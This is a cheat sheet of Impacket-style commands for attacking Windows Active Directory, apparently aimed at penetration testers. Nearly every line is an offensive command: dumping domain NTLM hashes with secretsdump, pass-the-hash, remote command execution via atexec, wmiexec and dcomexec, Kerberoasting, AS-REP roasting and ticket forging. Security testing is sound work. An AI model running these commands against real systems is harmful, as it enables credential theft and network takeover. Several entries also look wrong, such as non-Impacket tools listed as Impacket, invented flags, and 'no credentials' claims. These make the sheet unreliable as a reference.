---
legal-banner: true
---

### **IMPACKET TOOLKIT**

Impacket is a collection of Python classes for working with network protocols. It is highly regarded in the cybersecurity community for its ability to handle low-level network tasks and its extensive support for various protocols, making it an essential toolkit for penetration testers and security researchers.

### **PROTOCOLS SUPPORTED:**

### **SMB/SMB2**

SMBCLIENT.PY: Interactive SMB client to work with shares.

   1.  Access SMB shares interactively  
        `smbclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`

   2.  Lists all available shares on the target.  
        `smbclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -L`

SECRETSDUMP.PY: Dumps secrets from the remote machine without executing any agent.
    
   1.  Dumps NTLM hashes of all domain users from a domain controller.  
        `secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`

   2.  Dump NTLM Hashes Using Pass-the-Hash:  
        `secretsdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`
		
NETVIEW.PY: Enumerates shares and sessions on the network.
    
1.  Enumerate network shares and sessions  
     `netview.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`
2.  Enumerate Shares Using Pass-the-Hash:  
     `netview.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`

### **MSRPC**

RPCCLIENT.PY: A tool to execute client-side MSRPC calls.

1.  Execute MSRPC client calls  
      `rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`

2.  Enumerate Domain Users:  
      `rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "enumdomusers"`

3.  Enumerate Domain Groups:  
      `rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "enumdomgroups"`

 4.  Execute Command on Target Machine:  
     `rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "cmd"`

RPCDUMP.PY: Dumps information about endpoints and interfaces.
 
 1.  Dump RPC endpoints and interfaces info  
     `rpcdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`

2.  Dump RPC Endpoints Using Pass-the-Hash:  
     `rpcdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`

3.  Dump RPC Endpoints with No Credentials:  
    `rpcdump.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS]`

### **DCE/RPC**

ATEXEC.PY: Executes commands using the Task Scheduler service.

1.  Execute command using Task Scheduler  
    `atexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]`

2.  Execute Command Using Pass-the-Hash:  
   `atexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]`

3.  Execute Command with No Credentials:  
    `atexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]`

WMIEXEC.PY: Executes commands via WMI.

1.  Execute command via WMI  
        `wmiexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]`

2.  Execute Command Using Pass-the-Hash:  
        `wmiexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [command]`

3.  Execute Command with No Credentials:  
        `wmiexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]`

DCOMEXEC.PY: Executes commands using DCOM.

1.  Execute command using DCOM  
      `dcomexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]`

2.  Execute Command Using Pass-the-Hash:  
      `dcomexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]`

3.  Execute Command with No Credentials:  
    `dcomexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]`

### **LDAP**

GETADUSERS.PY: Enumerates all users in the domain.
    
1.  Enumerate all domain users  
    `GetADUsers.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`

2.  Enumerate all users including disabled accounts  
   `GetADUsers.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -all`

3.  Use Pass-the-Hash for Enumeration:  
   `GetADUsers.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`

GETUSERSPNS.PY: Enumerates Service Principal Names (SPNs) that are associated with user accounts.
    
1.  Enumerate user SPNs  
   `GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP-ADDRESS]`

2.  Request TGS for identified SPNs  
   `GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -request -dc-ip [IP-ADDRESS]`

3. Use Pass-the-Hash to enumerate SPNs.  
    `GetUserSPNs.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME] -dc-ip [IP-ADDRESS]`

WINDAPSEARCH.PY: performs LDAP queries against Windows Active Directory to enumerate objects like users and groups.
    
1.  Enumerates Group Policy Objects  
   `python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --gpos`

2.  Enumerates objects with administrative privileges  
   `python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --admin-objects`

3.  Enumerates users with Service Principal Names (SPNs)  
   `python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --user-spns`

4.  Enumerates users with unconstrained delegation  
    `python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --unconstrained-users`

5.  Enumerates computers with unconstrained delegation  
   `python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --unconstrained-computers`

### **KERBEROS**

TICKETER.PY: Generates Kerberos tickets that can be used for various attacks.

1.  Generate a TGT ticket for a user  
   `ticketer.py -nthash [NTHASH] -domain-sid [SID] [USERNAME]`

2.  Generate a service ticket for a user and SPN  
   `ticketer.py -nthash [NTHASH] -domain-sid [SID] -request [USERNAME] [SPN]`

3.  Generate TGT Ticket with AES Encryption:  
   `ticketer.py -aesKey [AESKEY] -domain-sid [SID] [USERNAME]`

GETNPUSERS.PY: Checks for accounts with Kerberos pre-authentication disabled and extracts their TGT data.

1.  Enumerate accounts with pre-auth disabled  
   `GetNPUsers.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP-ADDRESS]`

2.  Request TGT for identified accounts  
   `GetNPUsers.py [DOMAIN]/[USERNAME]:[PASSWORD] -request -dc-ip [IP-ADDRESS]`

3.  Request TGT Using Kerberos Authentication:  
   `GetNPUsers.py -k [DOMAIN]/[USERNAME] -request -dc-ip [IP-ADDRESS]`

### **NTLM**

LOOKUPSID.PY: Enumerates domain SID information.

1.  Enumerate domain SID info  
     `lookupsid.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`

2.  Enumerate Domain SID Info Using Pass-the-Hash:  
     `lookupsid.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`

3.  Enumerate Domain SID Info with No Credentials:  
      `lookupsid.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS]`

SECRETSDUMP.PY: Dumps secrets from the remote machine without executing any agent.

1.  Dump secrets from a remote machine  
     `secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`

2.  Dump secrets from the domain controller  
    `secretsdump.py -just-dc-user [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`

3.  Dump Secrets Using Pass-the-Hash:  
   `secretsdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`